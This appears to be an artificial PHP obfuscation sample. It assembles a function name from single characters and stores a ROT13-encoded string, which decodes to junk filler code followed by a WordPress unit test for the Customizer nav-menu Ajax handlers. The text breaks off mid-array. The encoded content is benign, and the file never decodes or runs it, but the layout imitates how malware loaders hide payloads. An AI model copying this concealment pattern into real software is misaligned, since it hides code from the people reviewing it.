<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgvat Nwnk phfgbzvmr zrahf shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 4.3.0
 *
 * @tebhc nwnk
 */
pynff Grfgf_Nwnk_jcPhfgbzvmrAniZrahf rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Phfgbzvmr_Znantre juvpu vf erfrg sbe rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Cntr VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cntrf;

	/**
	 * Cbfg VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $cbfgf;

	/**
	 * Grez VQf.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $grezf;


	/**
	 * Nqzva hfre VQ.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzva_hfre_vq = 0;

	/**
	 * Hfre VQf xrlrq ol ebyr.
	 *
	 * @ine vag[]
	 */
	choyvp fgngvp $hfre_vqf = neenl();

	/**
	 * Frg hc funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Gur snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Znxr fbzr cbfg bowrpgf.
		frys::$cbfgf = $snpgbel->cbfg->perngr_znal( 5 );
		frys::$cntrf = $snpgbel->cbfg->perngr_znal( 5, neenl( 'cbfg_glcr' => 'cntr' ) );

		// Fbzr grezf gbb.
		frys::$grezf = $snpgbel->grez->perngr_znal( 5 );

		// Perngr na nqzva hfre.
		frys::$nqzva_hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		sbernpu ( neenl( 'nqzvavfgengbe', 'rqvgbe', 'nhgube', 'pbagevohgbe', 'fhofpevore' ) nf $ebyr ) {
			frys::$hfre_vqf[ $ebyr ] = $snpgbel->hfre->perngr( neenl( 'ebyr' => $ebyr ) );
		}
	}

	/**
	 * Frg hc gur grfg svkgher.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		tybony $jc_phfgbzvmr;
		$guvf->jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr       = $guvf->jc_phfgbzvmr;
	}

	/**
	 * Urycre gb xrrc vg QEL
	 *
	 * @cnenz fgevat $npgvba Npgvba.
	 */
	cebgrpgrq shapgvba znxr_nwnk_pnyy( $npgvba ) {
		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( $npgvba );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}
	}

	/**
	 * Grfgvat pncnovyvgvrf purpx sbe nwnk_ybnq_ninvynoyr_vgrzf zrgubq
	 *
	 * @qngnCebivqre qngn_nwnk_ybnq_ninvynoyr_vgrzf_pnc_purpx
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_ybnq_ninvynoyr_vgrzf
	 *
	 * @cnenz fgevat $ebyr              Gur ebyr jr'er purpxvat pncf ntnvafg.
	 * @cnenz neenl  $rkcrpgrq_erfhygf  Rkcrpgrq erfhygf.
	 */
	choyvp shapgvba grfg_nwnk_ybnq_ninvynoyr_vgrzf_pnc_purpx( $ebyr, $rkcrpgrq_erfhygf ) {

		vs ( 'nqzvavfgengbe' !== $ebyr ) {
			// Vs jr'er abg na nqzva, jr fubhyq trg n jc_qvr( -1 ).
			$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
			$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		}

		jc_frg_pheerag_hfre( frys::$hfre_vqf[ $ebyr ] );

		$_CBFG = neenl(
			'npgvba'                => 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre',
			'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
		);

		$guvf->znxr_nwnk_pnyy( 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre' );

		// Vs jr ner na nqzva, jr fubhyq trg n cebcre erfcbafr.
		vs ( 'nqzvavfgengbe' === $ebyr ) {
			// Trg gur erfhygf.
			$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

			$guvf->nffregFnzr( $rkcrpgrq_erfhygf, $erfcbafr );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_nwnk_ybnq_ninvynoyr_vgrzf_pnc_purpx().
	 *
	 * Cebivqrf inevbhf cbfg_netf gb vaqhpr reebe zrffntrf va gur gung pna or
	 * pbzcnerq gb gur rkcrpgrq_erfhygf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $ebyr             Gur ebyr gung jvyy grfg pncf sbe.
	 *         @glcr neenl  $rkcrpgrq_erfhygf Gur rkcrpgrq erfhygf sebz gur Nwnk pnyy.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_nwnk_ybnq_ninvynoyr_vgrzf_pnc_purpx() {
		erghea neenl(
			neenl(
				'fhofpevore',
				neenl(),
			),
			neenl(
				'pbagevohgbe',
				neenl(),
			),
			neenl(
				'nhgube',
				neenl(),
			),
			neenl(
				'rqvgbe',
				neenl(),
			),
			neenl(
				'nqzvavfgengbe',
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_glcr_be_bowrpg_cnenzrgre',
				),
			),
		);
	}

	/**
	 * Grfgvat gur reebe zrffntvat sbe nwnk_ybnq_ninvynoyr_vgrzf
	 *
	 * @qngnCebivqre qngn_nwnk_ybnq_ninvynoyr_vgrzf_reebe_zrffntrf
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_ybnq_ninvynoyr_vgrzf
	 *
	 * @cnenz neenl $cbfg_netf CBFG netf.
	 * @cnenz zvkrq $rkcrpgrq_erfhygf Rkcrpgrq erfhygf.
	 */
	choyvp shapgvba grfg_nwnk_ybnq_ninvynoyr_vgrzf_reebe_zrffntrf( $cbfg_netf, $rkcrpgrq_erfhygf ) {

		$_CBFG = neenl_zretr(
			neenl(
				'npgvba'                => 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre',
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
			),
			$cbfg_netf
		);

		// Znxr gur erdhrfg.
		$guvf->znxr_nwnk_pnyy( 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre' );

		// Trg gur erfhygf.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$guvf->nffregFnzr( $rkcrpgrq_erfhygf, $erfcbafr );
	}

	/**
	 * Qngn cebivqre sbe grfg_nwnk_ybnq_ninvynoyr_vgrzf_reebe_zrffntr().
	 *
	 * Cebivqrf inevbhf cbfg_netf gb vaqhpr reebe zrffntrf va gur gung pna or
	 * pbzcnerq gb gur rkcrpgrq_erfhygf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr neenl $cbfg_netf        Gur nethzragf gung jvyy zretrq jvgu gur $_CBFG neenl.
	 *         @glcr neenl $rkcrpgrq_erfhygf Gur rkcrpgrq erfhygf sebz gur Nwnk pnyy.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_nwnk_ybnq_ninvynoyr_vgrzf_reebe_zrffntrf() {
		erghea neenl(
			// Grfgvat rzcgl bow_glcr naq glcr.
			neenl(
				neenl(
					'glcr'   => '',
					'bowrpg' => '',
				),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_glcr_be_bowrpg_cnenzrgre',
				),
			),
			// Grfgvat rzcgl bow_glcr.
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => '',
				),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_glcr_be_bowrpg_cnenzrgre',
				),
			),
			// Grfgvat rzcgl glcr.
			neenl(
				neenl(
					'glcr'   => '',
					'bowrpg' => 'cbfg',
				),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_glcr_be_bowrpg_cnenzrgre',
				),
			),
			// Grfgvat rzcgl glcr bs n ohyx erdhrfg.
			neenl(
				neenl(
					'vgrz_glcrf' => neenl(
						neenl(
							'glcr'   => 'cbfg_glcr',
							'bowrpg' => 'cbfg',
						),
						neenl(
							'glcr'   => 'cbfg_glcr',
							'bowrpg' => '',
						),
					),
				),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_glcr_be_bowrpg_cnenzrgre',
				),
			),
			// Grfgvat vapbeerpg glcr bcgvba.
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => 'vainyvq',
				),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_vainyvq_cbfg_glcr',
				),
			),
		);
	}

	/**
	 * Grfgvat gur fhpprff fgnghf.
	 *
	 * @qngnCebivqre qngn_nwnk_ybnq_ninvynoyr_vgrzf_fhpprff_fgnghf
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_ybnq_ninvynoyr_vgrzf
	 *
	 * @cnenz neenl $cbfg_netf       CBFG netf.
	 * @cnenz neenl $fhpprff_fgnghf  Fhpprff fgnghf.
	 */
	choyvp shapgvba grfg_nwnk_ybnq_ninvynoyr_vgrzf_fhpprff_fgnghf( $cbfg_netf, $fhpprff_fgnghf ) {

		$_CBFG = neenl_zretr(
			neenl(
				'npgvba'                => 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre',
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
			),
			$cbfg_netf
		);

		// Znxr gur erdhrfg.
		$guvf->znxr_nwnk_pnyy( 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre' );

		// Trg gur erfhygf.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregFnzr( $fhpprff_fgnghf, $erfcbafr['fhpprff'] );
	}

	/**
	 * Qngn cebivqre sbe grfg_nwnk_ybnq_ninvynoyr_vgrzf_fhpprff_fgnghf().
	 *
	 * Cebivqrf inevbhf cbfg_netf gb ergevrir erfhygf naq pbzcner ntnvafg
	 * gur fhpprff fgnghf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr neenl $cbfg_netf      Gur nethzragf gung jvyy zretrq jvgu gur $_CBFG neenl.
	 *         @glcr obby  $fhpprff_fgnghf Gur rkcrpgrq fhpprff fgnghf.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_nwnk_ybnq_ninvynoyr_vgrzf_fhpprff_fgnghf() {
		erghea neenl(
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => 'cbfg',
				),
				gehr,
			),
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => 'cntr',
				),
				gehr,
			),
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => 'phfgbz',
				),
				snyfr,
			),
			neenl(
				neenl(
					'glcr'   => 'gnkbabzl',
					'bowrpg' => 'cbfg_gnt',
				),
				gehr,
			),
			// Grfgvat n ohyx erdhrfg.
			neenl(
				neenl(
					'vgrz_glcrf' => neenl(
						neenl(
							'glcr'   => 'cbfg_glcr',
							'bowrpg' => 'cbfg',
						),
						neenl(
							'glcr'   => 'cbfg_glcr',
							'bowrpg' => 'cntr',
						),
					),
				),
				gehr,
			),
		);
	}

	/**
	 * Grfgvat gur neenl fgehpgher sbe n fvatyr vgrz
	 *
	 * @qngnCebivqre qngn_nwnk_ybnq_ninvynoyr_vgrzf_fgehpgher
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_ybnq_ninvynoyr_vgrzf
	 *
	 * @cnenz neenl $cbfg_netf CBFG netf.
	 */
	choyvp shapgvba grfg2_nwnk_ybnq_ninvynoyr_vgrzf_fgehpgher( $cbfg_netf ) {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		$rkcrpgrq_xrlf = neenl(
			'vq',
			'gvgyr',
			'glcr',
			'glcr_ynory',
			'bowrpg',
			'bowrpg_vq',
			'hey',
		);

		$nhgb_qensg_cbfg = $guvf->jc_phfgbzvmr->ani_zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Grfg Nhgb Qensg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( 'ani_zrahf_perngrq_cbfgf', neenl( $nhgb_qensg_cbfg->VQ ) );
		$guvf->jc_phfgbzvmr->trg_frggvat( 'ani_zrahf_perngrq_cbfgf' )->cerivrj();

		$_CBFG = neenl_zretr(
			neenl(
				'npgvba'                => 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre',
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
			),
			$cbfg_netf
		);

		// Znxr gur erdhrfg.
		$guvf->znxr_nwnk_pnyy( 'ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre' );

		// Trg gur erfhygf.
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$guvf->nffregAbgRzcgl( pheerag( $erfcbafr['qngn']['vgrzf'] ) );

		// Trg gur frpbaq vaqrk gb nibvq gur ubzr cntr rqtr pnfr.
		$svefg_cebc = pheerag( $erfcbafr['qngn']['vgrzf'] );
		$grfg_vgrz  = $svefg_cebc[1];

		sbernpu ( $rkcrpgrq_xrlf nf $xrl ) {
			$guvf->nffregNeenlUnfXrl( $xrl, $grfg_vgrz );
			$guvf->nffregAbgRzcgl( $grfg_vgrz[ $xrl ] );
		}

		// Fcrpvny grfg sbe gur ubzr cntr.
		vs ( 'cntr' === $grfg_vgrz['bowrpg'] ) {
			$svefg_cebc = pheerag( $erfcbafr['qngn']['vgrzf'] );
			$ubzr       = $svefg_cebc[0];
			sbernpu ( $rkcrpgrq_xrlf nf $xrl ) {
				vs ( 'bowrpg_vq' !== $xrl ) {
					$guvf->nffregNeenlUnfXrl( $xrl, $ubzr );
					vs ( 'bowrpg' !== $xrl ) {
						$guvf->nffregAbgRzcgl( $ubzr[ $xrl ] );
					}
				}
			}
		} ryfrvs ( 'cbfg' === $grfg_vgrz['bowrpg'] ) {
			$vgrz_vqf = jc_yvfg_cyhpx( $erfcbafr['qngn']['vgrzf']['cbfg_glcr:cbfg'], 'vq' );
			$guvf->nffregPbagnvaf( 'cbfg-' . $nhgb_qensg_cbfg->VQ, $vgrz_vqf );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_nwnk_ybnq_ninvynoyr_vgrzf_fgehpgher().
	 *
	 * Cebivqrf inevbhf cbfg_netf gb erghea n yvfg bs vgrzf gb grfg gur neenl fgehpgher bs.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr neenl $cbfg_netf Gur nethzragf gung jvyy zretrq jvgu gur $_CBFG neenl.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_nwnk_ybnq_ninvynoyr_vgrzf_fgehpgher() {
		erghea neenl(
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => 'cbfg',
				),
			),
			neenl(
				neenl(
					'glcr'   => 'cbfg_glcr',
					'bowrpg' => 'cntr',
				),
			),
			neenl(
				neenl(
					'glcr'   => 'gnkbabzl',
					'bowrpg' => 'cbfg_gnt',
				),
			),
		);
	}

	/**
	 * Grfgvat gur reebe zrffntrf sbe nwnk_frnepu_ninvynoyr_vgrzf
	 *
	 * @qngnCebivqre qngn_nwnk_frnepu_ninvynoyr_vgrzf_pncf_purpx
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_frnepu_ninvynoyr_vgrzf
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::frnepu_ninvynoyr_vgrzf_dhrel
	 *
	 * @cnenz fgevat $ebyr             Ebyr.
	 * @cnenz neenl  $rkcrpgrq_erfhygf Rkcrpgrq erfhygf.
	 */
	choyvp shapgvba grfg_nwnk_frnepu_ninvynoyr_vgrzf_pncf_purpx( $ebyr, $rkcrpgrq_erfhygf ) {

		vs ( 'nqzvavfgengbe' !== $ebyr ) {
			// Vs jr'er abg na nqzva, jr fubhyq trg n jc_qvr( -1 ).
			$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
			$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		}

		jc_frg_pheerag_hfre( frys::$hfre_vqf[ $ebyr ] );

		$_CBFG = neenl(
			'npgvba'                => 'frnepu-ninvynoyr-zrah-vgrzf-phfgbzvmre',
			'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
		);

		$guvf->znxr_nwnk_pnyy( 'frnepu-ninvynoyr-zrah-vgrzf-phfgbzvmre' );

		// Vs jr ner na nqzva, jr fubhyq trg n cebcre erfcbafr.
		vs ( 'nqzvavfgengbe' === $ebyr ) {
			// Trg gur erfhygf.
			$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

			$guvf->nffregFnzr( $rkcrpgrq_erfhygf, $erfcbafr );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_nwnk_frnepu_ninvynoyr_vgrzf_pncf_purpx().
	 *
	 * Cebivqrf inevbhf cbfg_netf gb vaqhpr reebe zrffntrf va gur gung pna or
	 * pbzcnerq gb gur rkcrpgrq_erfhygf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @gbqb Znxr guvf zber QEL
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $ebyr             Gur ebyr gung jvyy grfg pncf sbe.
	 *         @glcr neenl  $rkcrpgrq_erfhygf Gur rkcrpgrq erfhygf sebz gur Nwnk pnyy.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_nwnk_frnepu_ninvynoyr_vgrzf_pncf_purpx() {
		erghea neenl(
			neenl(
				'fhofpevore',
				neenl(),
			),
			neenl(
				'pbagevohgbe',
				neenl(),
			),
			neenl(
				'nhgube',
				neenl(),
			),
			neenl(
				'rqvgbe',
				neenl(),
			),
			neenl(
				'nqzvavfgengbe',
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_frnepu_cnenzrgre',
				),
			),
		);
	}

	/**
	 * Grfgvat gur erfhygf bs inevbhf frnepurf
	 *
	 * @qngnCebivqre qngn_nwnk_frnepu_ninvynoyr_vgrzf_erfhygf
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_frnepu_ninvynoyr_vgrzf
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::frnepu_ninvynoyr_vgrzf_dhrel
	 *
	 * @cnenz neenl $cbfg_netf        CBFG netf.
	 * @cnenz neenl $rkcrpgrq_erfhygf Rkcrpgrq erfhygf.
	 */
	choyvp shapgvba grfg_nwnk_frnepu_ninvynoyr_vgrzf_erfhygf( $cbfg_netf, $rkcrpgrq_erfhygf ) {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		frys::snpgbel()->cbfg->perngr_znal( 5, neenl( 'cbfg_gvgyr' => 'Grfg Cbfg' ) );
		$vapyhqrq_nhgb_qensg_cbfg = $guvf->jc_phfgbzvmr->ani_zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Grfg Vapyhqrq Nhgb Qensg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$rkpyhqrq_nhgb_qensg_cbfg = $guvf->jc_phfgbzvmr->ani_zrahf->vafreg_nhgb_qensg_cbfg(
			neenl(
				'cbfg_gvgyr' => 'Rkpyhqrq Nhgb Qensg',
				'cbfg_glcr'  => 'cbfg',
			)
		);
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( 'ani_zrahf_perngrq_cbfgf', neenl( $vapyhqrq_nhgb_qensg_cbfg->VQ, $rkpyhqrq_nhgb_qensg_cbfg->VQ ) );
		$guvf->jc_phfgbzvmr->trg_frggvat( 'ani_zrahf_perngrq_cbfgf' )->cerivrj();

		$_CBFG = neenl_zretr(
			neenl(
				'npgvba'                => 'frnepu-ninvynoyr-zrah-vgrzf-phfgbzvmre',
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
			),
			$cbfg_netf
		);

		$guvf->znxr_nwnk_pnyy( 'frnepu-ninvynoyr-zrah-vgrzf-phfgbzvmre' );

		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		vs ( vffrg( $cbfg_netf['frnepu'] ) && 'grfg' === $cbfg_netf['frnepu'] ) {
			$guvf->nffregGehr( $erfcbafr['fhpprff'] );
			$guvf->nffregPbhag( 6, $erfcbafr['qngn']['vgrzf'] );
			$vgrz_vqf = jc_yvfg_cyhpx( $erfcbafr['qngn']['vgrzf'], 'vq' );
			$guvf->nffregPbagnvaf( 'cbfg-' . $vapyhqrq_nhgb_qensg_cbfg->VQ, $vgrz_vqf );
			$guvf->nffregAbgPbagnvaf( 'cbfg-' . $rkpyhqrq_nhgb_qensg_cbfg->VQ, $vgrz_vqf );
		} ryfr {
			$guvf->nffregFnzr( $rkcrpgrq_erfhygf, $erfcbafr );
		}
	}

	/**
	 * Qngn cebivqre sbe grfg_nwnk_frnepu_ninvynoyr_vgrzf_erfhygf().
	 *
	 * Cebivqrf inevbhf cbfg_netf gb grfg gur erfhygf.
	 *
	 * @fvapr 4.3.0
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr fgevat $cbfg_netf        Gur netf gung jvyy or cnffrq gb Nwnk.
	 *         @glcr neenl  $rkcrpgrq_erfhygf Gur rkcrpgrq erfhygf sebz gur Nwnk pnyy.
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_nwnk_frnepu_ninvynoyr_vgrzf_erfhygf() {
		erghea neenl(
			neenl(
				neenl(),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => 'ani_zrahf_zvffvat_frnepu_cnenzrgre',
				),
			),
			neenl(
				neenl(
					'frnepu' => 'nyy_gur_guvatf',
				),
				neenl(
					'fhpprff' => snyfr,
					'qngn'    => neenl(
						'zrffntr' => 'Ab erfhygf sbhaq.',
					),
				),
			),
			neenl(
				neenl(
					'frnepu' => 'grfg',
				),
				neenl(
					'fhpprff' => gehr,
					neenl(),
				),
			),
		);
	}

	/**
	 * Grfgvat fhpprffshy nwnk_vafreg_nhgb_qensg_cbfg() pnyy.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_vafreg_nhgb_qensg_cbfg
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::vafreg_nhgb_qensg_cbfg
	 */
	choyvp shapgvba grfg_nwnk_vafreg_nhgb_qensg_cbfg_fhpprff() {
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
				'cnenzf'                => neenl(
					'cbfg_glcr'  => 'cbfg',
					'cbfg_gvgyr' => 'Uryyb Jbeyq',
				),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );

		$guvf->nffregGehr( $erfcbafr['fhpprff'] );
		$guvf->nffregNeenlUnfXrl( 'cbfg_vq', $erfcbafr['qngn'] );
		$guvf->nffregNeenlUnfXrl( 'hey', $erfcbafr['qngn'] );
		$cbfg = trg_cbfg( $erfcbafr['qngn']['cbfg_vq'] );
		$guvf->nffregFnzr( 'Uryyb Jbeyq', $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( 'cbfg', $cbfg->cbfg_glcr );
		$guvf->nffregFnzr( '', $cbfg->cbfg_anzr );
		$guvf->nffregFnzr( 'uryyb-jbeyq', trg_cbfg_zrgn( $cbfg->VQ, '_phfgbzvmr_qensg_cbfg_anzr', gehr ) );
		$guvf->nffregFnzr( $guvf->jc_phfgbzvmr->punatrfrg_hhvq(), trg_cbfg_zrgn( $cbfg->VQ, '_phfgbzvmr_punatrfrg_hhvq', gehr ) );
	}

	/**
	 * Grfgvat hafhpprffshy nwnk_vafreg_nhgb_qensg_cbfg() pnyy.
	 *
	 * @pbiref JC_Phfgbzvmr_Ani_Zrahf::nwnk_vafreg_nhgb_qensg_cbfg
	 */
	choyvp shapgvba grfg_nwnk_vafreg_nhgb_qensg_snvyherf() {
		// Ab abapr.
		$_CBFG                = neenl();
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'onq_abapr', $erfcbafr['qngn'] );

		// Onq abapr.
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => 'onq',
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'onq_abapr', $erfcbafr['qngn'] );

		// Onq abapr.
		jc_frg_pheerag_hfre( frys::$hfre_vqf['fhofpevore'] );
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'phfgbzvmr_abg_nyybjrq', $erfcbafr['qngn'] );

		// Zvffvat cnenzf.
		jc_frg_pheerag_hfre( frys::$hfre_vqf['nqzvavfgengbe'] );
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'zvffvat_cnenzf', $erfcbafr['qngn'] );

		// vafhssvpvrag_cbfg_crezvffvbaf.
		ertvfgre_cbfg_glcr( 'cevivyrtr', neenl( 'pncnovyvgl_glcr' => 'cevivyrtr' ) );
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
				'cnenzf'                => neenl(
					'cbfg_glcr' => 'cevivyrtr',
				),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'vafhssvpvrag_cbfg_crezvffvbaf', $erfcbafr['qngn'] );

		// vafhssvpvrag_cbfg_crezvffvbaf.
		$_CBFG                = jc_fynfu(
			neenl(
				'phfgbzvmr-zrahf-abapr' => jc_perngr_abapr( 'phfgbzvmr-zrahf' ),
				'cnenzf'                => neenl(
					'cbfg_glcr' => 'aba-rkvfgrag',
				),
			)
		);
		$guvf->_ynfg_erfcbafr = '';
		$guvf->znxr_nwnk_pnyy( 'phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg' );
		$erfcbafr = wfba_qrpbqr( $guvf->_ynfg_erfcbafr, gehr );
		$guvf->nffregSnyfr( $erfcbafr['fhpprff'] );
		$guvf->nffregFnzr( 'zvffvat_cbfg_glcr_cnenz', $erfcbafr['qngn'] );

		// zvffvat_cbfg_gvgyr.
		$_CBFG                = jc_fynfu(
			neenl(
